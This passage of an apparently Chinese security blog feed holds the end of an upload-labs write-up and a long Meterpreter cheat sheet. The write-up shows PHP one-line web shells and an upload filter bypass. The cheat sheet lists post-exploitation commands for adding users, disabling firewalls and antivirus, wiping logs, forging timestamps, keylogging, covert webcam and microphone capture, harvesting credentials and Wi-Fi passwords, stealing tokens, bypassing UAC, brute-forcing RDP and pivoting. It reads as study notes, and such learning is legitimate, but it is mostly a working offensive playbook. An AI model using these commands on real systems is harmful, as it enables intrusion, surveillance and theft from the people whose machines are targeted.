 &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">如果不是数组则将其拆成数组，然后数组最后一个的值(end函数就是取数组最后一个的值)同白名单做比较，符合jpg、png、gif中的一种就允许上传了。</span><br><span class="line"></span><br><span class="line">  在允许上传之后还要把数组的值拼接在一起对文件进行重命名。所以我们可以构造save_name[0]=a.php/  save_name[1]置为空  save_name[2]=jpg(一个白名单的合法后缀)。</span><br><span class="line"></span><br><span class="line">  这样的话，reset($file)取的是数组的第一个元素即cs.php/，然后接了一个&#x27;.&#x27;符号，之后又将数组最后一个元素内容拼接到一起。</span><br><span class="line"></span><br><span class="line">  可能有的人会疑问数组最后一个值不是jpg吗？其实当我们只设置了两个数组元素的时候，数组的元素个数就只有两个了。</span><br><span class="line"></span><br><span class="line">  既然一共只有两个元素，这里就是$file[2-1]也就是$file[1]。因此拼接的就是空的，最终得到的文件名就是a.php/.</span><br><span class="line"></span><br><span class="line">  对于像a.php/.这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的/.。如此一来我们上传到服务器的文件还是被重命名为了php后缀。</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313105140361.png" alt="image-20210313105140361"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313105520758.png" alt="image-20210313105520758"></p><p>eval 和 system 区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_REQUEST[cmd]);?&gt;</span><br><span class="line">&lt;?php system($_REQUEST[cmd]);?&gt;</span><br><span class="line"></span><br><span class="line">PHP的eval类型函数，一句话：代码执行而不是命令执行。（菜刀用这类）</span><br><span class="line">PHP的system类型函数，一句话：命令执行而不是代码执行。</span><br><span class="line"></span><br><span class="line">eval</span><br><span class="line">http://IP/upload/b.php?cmd=system(&quot;dir c:\\&quot;);</span><br><span class="line">http://IP/upload/b.php?cmd=system(&quot;type c:\\flag*.txt&quot;);</span><br><span class="line"></span><br><span class="line">system</span><br><span class="line">http://IP/upload/b.php?cmd=dir c:\</span><br><span class="line">http://IP/upload/b.php?cmd=type c:\flag*.txt</span><br></pre></td></tr></table></figure><h2 id="拓展过滤"><a class="markdownIt-Anchor" href="#拓展过滤">#</a> 拓展 (过滤 &lt;?)</h2><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210314105556365.png" alt="image-20210314105556365"></p><p>buuctf 题目：<span class="exturl" data-url="aHR0cDovLzdmMDJmM2Y0LWU2NjUtNDVkZC04NTcyLTFiYjNlZGIxNmE4MS5ub2RlMy5idXVvai5jbi8=">http://7f02f3f4-e665-45dd-8572-1bb3edb16a81.node3.buuoj.cn/</span></p><p>进行 burp 抓包上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210314105809630.png" alt="image-20210314105809630"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210314105819324.png" alt="image-20210314105819324"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210314110325454.png" alt="image-20210314110325454"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210314110346852.png" alt="image-20210314110346852"></p>]]></content>
      
      
      
        <tags>
            
            <tag> upload-labs通关记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meterpreter学习笔记</title>
      <link href="2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/"/>
      <url>2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="meterpreter学习笔记总结"><a class="markdownIt-Anchor" href="#meterpreter学习笔记总结">#</a> meterpreter 学习笔记总结</h2><h2 id="系统命令"><a class="markdownIt-Anchor" href="#系统命令">#</a> 系统命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">background # 将当前会话放置后台</span><br><span class="line">sessions # sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID 值&gt; #进入会话 -k 杀死会话</span><br><span class="line">bgrun / run # 执行已有的模块，输入 run 后按两下 tab，列出已有的脚本</span><br><span class="line">info # 查看已有模块信息</span><br><span class="line">getuid # 查看当前用户身份</span><br><span class="line">getprivs # 查看当前用户具备的权限</span><br><span class="line">getpid # 获取当前进程 ID(PID)</span><br><span class="line">sysinfo # 查看目标机系统信息</span><br><span class="line">irb # 开启 ruby 终端</span><br><span class="line">ps # 查看正在运行的进程</span><br><span class="line">kill &lt;PID 值&gt; # 杀死指定 PID 进程</span><br><span class="line">idletime # 查看目标机闲置时间</span><br><span class="line">reboot / shutdown # 重启/关机</span><br><span class="line">shell # 进入目标机 cmd shell</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306164115799.png" alt="image-20210306164115799"></p><h2 id="常用-cmd-命令"><a class="markdownIt-Anchor" href="#常用-cmd-命令">#</a> 常用 cmd 命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">whoami # 当前权限</span><br><span class="line">quser # 查询当前在线的管理员</span><br><span class="line">net user # 查看存在用户</span><br><span class="line">net user 用户名 密码 /add # 添加用户和对应密码</span><br><span class="line">net localgroup 用户组名 用户名 /add # 将指定用户添加到指定用户组</span><br><span class="line">netstat -ano # 查询当前计算机中网络连接通信情况，LISTENING 表示该端口处于监听状态；ESTABLISHED 表示该端口处于工作（通信）状态</span><br><span class="line">systeminfo # 查看当前计算机中的详细情况</span><br><span class="line">tasklist /svc # 查看每个进程所对应的服务</span><br><span class="line">taskkill /f /im 程序名称 # 结束某个指定名称的程序</span><br><span class="line">taskkill /f /PID ID # 结束某个指定 PID 的进程</span><br><span class="line">tasklist | findstr &quot;字符串&quot; # 查找输出结果中指定的内容</span><br><span class="line">logoff # 注销某个指定用户的 ID</span><br><span class="line">shutdown -r # 重启当前计算机</span><br><span class="line">netsh adcfirewall set allprofiles state off # 关闭防火墙</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306164329741.png" alt="image-20210306164329741"></p><h3 id="uictl-开关键盘鼠标"><a class="markdownIt-Anchor" href="#uictl-开关键盘鼠标">#</a> uictl 开关键盘 / 鼠标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl [enable/disable] [keyboard/mouse/all] # 开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse # 禁用鼠标</span><br><span class="line">uictl disable keyboard # 禁用键盘</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306164436345.png" alt="image-20210306164436345"></p><h3 id="execute-执行文件"><a class="markdownIt-Anchor" href="#execute-执行文件">#</a> execute 执行文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程 cmd.exe，-H 不可见，-i 交互</span><br><span class="line">execute -H -m -d notepad.exe -f payload.exe -a &quot;-o hack.txt&quot;</span><br><span class="line"># -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行</span><br><span class="line">&quot;-o hack.txt&quot;是 payload.exe 的运行参数</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306164555155.png" alt="image-20210306164555155"></p><h3 id="clearav-清除日志"><a class="markdownIt-Anchor" href="#clearav-清除日志">#</a> clearav 清除日志</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearav # 清除 windows 中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306164632840.png" alt="image-20210306164632840"></p><h2 id="文件系统命令"><a class="markdownIt-Anchor" href="#文件系统命令">#</a> 文件系统命令</h2><p>基本文件系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ls # 列出当前目录中的文件列表</span><br><span class="line">cd # 进入指定目录</span><br><span class="line">getwd / pwd # 查看当前工作目录</span><br><span class="line">search -d c:\\ -f *.txt # 搜索文件 -d 目录 -f 文件名</span><br><span class="line">cat c:\\123.txt # 查看文件内容</span><br><span class="line">upload /tmp/hack.txt C:\\ # 上传文件到目标机上</span><br><span class="line">download c:\\123.txt /tmp/ # 下载文件到本机上</span><br><span class="line">edit c:\\test.txt # 编辑或创建文件 没有的话，会新建文件</span><br><span class="line">rm C:\\hack.txt # 删除文件</span><br><span class="line">mkdir admin # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir admin # 只能删除当前目录下文件夹</span><br><span class="line">getlwd / lpwd # 查看本地当前目录</span><br><span class="line">lcd /tmp # 切换本地目录</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306164754287.png" alt="image-20210306164754287"></p><h3 id="timestomp-伪造时间戳"><a class="markdownIt-Anchor" href="#timestomp-伪造时间戳">#</a> timestomp 伪造时间戳</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:\\ -h #查看帮助</span><br><span class="line">timestomp -v C:\\2.txt #查看时间戳</span><br><span class="line">timestomp C:\\2.txt -f C:\\1.txt #将 1.txt 的时间戳复制给 2.txt</span><br><span class="line">timestomp c:\\test\\22.txt -z &quot;03/10/2019 11:55:55&quot; -v # 把四个属性设置为统一时间</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306164910512.png" alt="image-20210306164910512"></p><h2 id="网络命令"><a class="markdownIt-Anchor" href="#网络命令">#</a> 网络命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig # 查看网络接口信息</span><br><span class="line">netstat –ano # 查看网络连接状态</span><br><span class="line">arp # 查看 arp 缓冲表</span><br><span class="line">getproxy # 查看代理信息</span><br><span class="line">route # 查看路由表信息</span><br></pre></td></tr></table></figure><h3 id="portfwd-端口转发"><a class="markdownIt-Anchor" href="#portfwd-端口转发">#</a> portfwd 端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 1234 -p 3389 -r 127.0.0.1</span><br><span class="line">#将目标机的 3389 端口转发到本地 1234 端口</span><br><span class="line">rdesktop 127.0.0.1:1234 # 需要输入用户名密码连接</span><br><span class="line">rdesktop -u Administrator -p P@ssw0rd 127.0.0.1:1234 # -u 用户名 -p 密码</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306165457433.png" alt="image-20210306165457433"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306165547893.png" alt="image-20210306165547893"></p><h3 id="autoroute-添加路由"><a class="markdownIt-Anchor" href="#autoroute-添加路由">#</a> autoroute 添加路由</h3><p>参考  <span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODY1MDU=">https://www.anquanke.com/post/id/86505</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -h # 查看帮助</span><br><span class="line">run get_local_subnets # 查看目标内网网段地址</span><br><span class="line">run autoroute -s 192.168.183.0/24 # 添加目标网段路由</span><br><span class="line">run autoroute -p # 查看添加的路由</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306165902512.png" alt="image-20210306165902512"></p><p>利用 arp_scanner、portscan 等进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.183.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.183.146 PORTS=3389</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306170155805.png" alt="image-20210306170155805"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306170548344.png" alt="image-20210306170548344"></p><h3 id="socks-代理"><a class="markdownIt-Anchor" href="#socks-代理">#</a> Socks 代理</h3><p>只有在目标设备添加完路由后才可以通过 msf 自带的 socks4a 模块进行 socks4 代理转发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 2000</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306170840980.png" alt="image-20210306170840980"></p><p>然后 vim /etc/proxychains.conf ，在文件末尾添加 socks4 代理服务器</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306170930216.png" alt="image-20210306170930216"></p><p>使用 proxychains 代理访问执行 nmap 操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sV -p 445 --script=smb-vuln-ms17-010.nse 192.168.183.146 # 扫描永恒之蓝漏洞</span><br><span class="line">proxychains hydra 192.168.183.146 rdp -l administrator -P password.txt -V # rdp 服务暴力破解</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306171108261.png" alt="image-20210306171108261"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306171139549.png" alt="image-20210306171139549"></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集">#</a> 信息收集</h2><p>常用脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">run arp_scanner -r 192.168.183.1/24 # 利用 arp 进行存活主机扫描</span><br><span class="line">run winenum # 自动化执行一些检测脚本</span><br><span class="line">run credcollect # 获取用户 hash</span><br><span class="line">run domain_list_gen # 获取域管理账户列表</span><br><span class="line">run post/multi/gather/env # 获取用户环境变量</span><br><span class="line">run post/windows/gather/enum_logged_on_users -c # 列出当前登录用户</span><br><span class="line">run post/linux/gather/checkvm # 是否虚拟机</span><br><span class="line">run post/windows/gather/checkvm # 是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives # 查看存储器信息</span><br><span class="line">run post/windows/gather/enum_applications # 获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks # 获取最近访问过的文档、链接信息</span><br><span class="line">run post/windows/gather/enum_ie # 获取 IE 缓存</span><br><span class="line">run post/windows/gather/enum_firefox # 获取 firefox 缓存</span><br><span class="line">run post/windows/gather/enum_chrome # 获取 Chrome 缓存</span><br><span class="line">run post/multi/recon/local_exploit_suggester # 获取本地提权漏洞</span><br><span class="line">run post/windows/gather/enum_patches # 获取补丁信息</span><br><span class="line">run post/windows/gather/enum_domain # 查找域控</span><br><span class="line">run post/windows/gather/enum_snmp # 获取 snmp 团体名称</span><br><span class="line">run post/windows/gather/credentials/vnc # 获取 vnc 密码</span><br><span class="line">run post/windows/wlan/wlan_profile # 用于读取目标主机 WiFi 密码</span><br><span class="line">run post/multi/gather/wlan_geolocate # 基于 wlan 进行地理位置确认 文件位于/root/.msf4/loot</span><br><span class="line">run post/windows/manage/killav 关闭杀毒软件</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306171454981.png" alt="image-20210306171454981"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306171504647.png" alt="image-20210306171504647"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306171918329.png" alt="image-20210306171918329"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306172108912.png" alt="image-20210306172108912"></p><h3 id="常用的破解模块"><a class="markdownIt-Anchor" href="#常用的破解模块">#</a> 常用的破解模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">auxiliary/scanner/ftp/ftp_login</span><br><span class="line">auxiliary/scanner/ssh/ssh_login</span><br><span class="line">auxiliary/scanner/telnet/telnet_login</span><br><span class="line">auxiliary/scanner/smb/smb_login</span><br><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">auxiliary/scanner/mysql/mysql_login</span><br><span class="line">auxiliary/scanner/oracle/oracle_login</span><br><span class="line">auxiliary/scanner/postgres/postgres_login</span><br><span class="line">auxiliary/scanner/vnc/vnc_login</span><br><span class="line">auxiliary/scanner/pcanywhere/pcanywhere_login</span><br><span class="line">auxiliary/scanner/snmp/snmp_login</span><br><span class="line">auxiliary/scanner/ftp/anonymous</span><br></pre></td></tr></table></figure><h3 id="键盘记录"><a class="markdownIt-Anchor" href="#键盘记录">#</a> 键盘记录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start # 开始键盘记录</span><br><span class="line">keyscan_dump # 导出记录数据</span><br><span class="line">keyscan_stop # 结束键盘记录</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306172219342.png" alt="image-20210306172219342"></p><h3 id="sniffer-抓包"><a class="markdownIt-Anchor" href="#sniffer-抓包">#</a> sniffer 抓包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces # 查看网卡</span><br><span class="line">sniffer_start 1 # 选择网卡 1 开始抓包</span><br><span class="line">sniffer_stats 1 # 查看网卡 1 状态</span><br><span class="line">sniffer_dump 1 /tmp/wlan1.pcap # 导出 pcap 数据包</span><br><span class="line">sniffer_stop 1 # 停止网卡 1 抓包</span><br><span class="line">sniffer_release 1 # 释放网卡 1 流量</span><br></pre></td></tr></table></figure><h3 id="窃取令牌"><a class="markdownIt-Anchor" href="#窃取令牌">#</a> 窃取令牌</h3><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306172412924.png" alt="image-20210306172412924"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid 值&gt; # 从指定进程中窃取 token</span><br><span class="line">drop_token # 停止假冒当前的 token</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306172447283.png" alt="image-20210306172447283"></p><h3 id="网络摄像头"><a class="markdownIt-Anchor" href="#网络摄像头">#</a> 网络摄像头</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">record_mic # 音频录制</span><br><span class="line">webcam_chat # 开启视频聊天(对方有弹窗）</span><br><span class="line">webcam_list # 查看摄像头</span><br><span class="line">webcam_snap # 通过摄像头拍照</span><br><span class="line">webcam_stream # 通过摄像头开启视频监控(以网页形式进行监控≈直播）</span><br></pre></td></tr></table></figure><h3 id="截屏"><a class="markdownIt-Anchor" href="#截屏">#</a> 截屏</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">截屏</span><br><span class="line">screenshot # 截屏</span><br><span class="line">use espia # 使用 espia 模块</span><br><span class="line">screengrab # 截屏</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="markdownIt-Anchor" href="#提权">#</a> 提权</h2><p>getsystem 提权<br>利用 getsystem 命令提权，该命令会自动寻找各种可能的提权技术来使得用户将权限提升到更高的级别。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem 提权</span><br><span class="line">getuid 查看已获得权限</span><br></pre></td></tr></table></figure><h3 id="enum_patches-模块"><a class="markdownIt-Anchor" href="#enum_patches-模块">#</a> enum_patches 模块</h3><p>利用 enum_patches 模块搜集补丁信息，然后寻找可利用的 exploits 进行提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches #查看补丁信息</span><br><span class="line">background</span><br><span class="line">search MS10-015</span><br><span class="line">use exploit/windows/local/ms10_015_kitrap0d</span><br><span class="line">set session 8</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306172904051.png" alt="image-20210306172904051"></p><h3 id="绕过-uac-提权"><a class="markdownIt-Anchor" href="#绕过-uac-提权">#</a> 绕过 UAC 提权</h3><p>msf 内置一些 bypassuac 脚本，原理不同，使用方法类似，执行后返回一个新的会话，再次执行 getsystem 即可提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/local/bypassuac_silentcleanup</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br></pre></td></tr></table></figure><p>使用命令 getsystem 提权失败，然后利用 bypassuac 来提权，这里利用 exploit/windows/local/bypassuac 模块 (32 位、64 位都有效)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">backgroup</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306173046136.png" alt="image-20210306173046136"></p><h3 id="使用-runas-提权"><a class="markdownIt-Anchor" href="#使用-runas-提权">#</a> 使用 RunAs 提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">该方法利用 exploit/windows/local/ask 模块(32 位、64 位都有效)，创建一个可执行文件并在目标机上发起一个提升权限请求的</span><br><span class="line">程序，触发系统 UAC，提示用户是否要继续，如果用户选择“是”，则会返回一个高权限的 meterpreter shell。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br><span class="line">set filename update.exe # 设置反弹程序名称</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>输入 run 命令以后会在目标机上弹出 UAC，提示用户是否允许，选择是就会返回一个高权限的 meterpreter shell</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306173138736.png" alt="image-20210306173138736"></p><p>注意事项：<br>使用 RunAs 模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序 UAC 设置则没有要求。<br>使用 RunAs 模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用 EXE::Custom 选项。</p><h3 id="假冒令牌提权"><a class="markdownIt-Anchor" href="#假冒令牌提权">#</a> 假冒令牌提权</h3><p>令牌是系统临时密钥，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。一般有两种类型的令牌，一种是 Delegation Tokens，也就是授权令牌，它支持交互式登录（例如远程桌面登陆登录）。还有一种是 Impersonation Tokens，也就是模拟令牌，它是非交互的会话（例如访问文件共享）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use incognito # 加载窃取令牌模块</span><br><span class="line">list_tokens -u # 查看可用的用户令牌</span><br><span class="line">list_tokens -g # 查看可用的用户组令牌</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27; # 假冒 SYSTEM token</span><br><span class="line">rev2self #返回原始 token</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306173332626.png" alt="image-20210306173332626"></p><h3 id="利用-alwaysinstallelevated-提权"><a class="markdownIt-Anchor" href="#利用-alwaysinstallelevated-提权">#</a> 利用 AlwaysInstallElevated 提权</h3><p>AlwaysInstallElevated 是一个策略设置。微软允许非授权用户以 SYSTEM 权限运行安装文件 (MSI)，如果用户启用此策略设置，那么黑客利用恶意的 MSI 文件就可以进行管理员权限的提升。</p><p>查看 AlwaysInstallElevated 是否被定义</p><p>不过利用此方法有个前提条件，需要有两个注册表的键值为 1，我们可以在 cmdshell 下查看 AlwaysInstallElevated 是否被定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevate</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306173505093.png" alt="image-20210306173505093"></p><p>如上图所示已经开启 AlwaysInstallElevated，如果在组策略里未定义 AlwaysInstallElevated，则会出现 “错误：系统找不到指定的注册表项或值” 的提示，如下图所示：</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306173520115.png" alt="image-20210306173520115"></p><p>如果需要开启可以选择以下方法：<br>1. 打开组策略编辑器（运行框输入 gpedit.msc）<br>2. 组策略 -&gt; 计算机配置 -&gt; 管理模版 